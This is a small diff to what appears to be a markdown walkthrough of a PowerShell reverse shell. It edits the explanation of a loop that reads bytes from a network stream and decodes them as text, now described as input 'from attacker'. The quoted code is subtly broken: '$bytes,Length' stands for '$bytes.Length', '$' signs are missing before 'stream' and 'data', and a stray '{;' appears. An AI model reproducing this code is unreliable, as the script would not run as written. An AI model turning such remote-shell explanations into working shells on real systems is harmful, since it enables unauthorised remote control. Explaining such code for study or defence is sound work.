@@ -56,4 +56,5 @@ while (($i = stream.Read($bytes,0,$bytes,Length)) -ne 0)
 ```powershell
 {; data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)}
 ```
-- Converts bytes into readable text 
+- Converts bytes from attacker into readable text and stores the result in `$data`
+- 
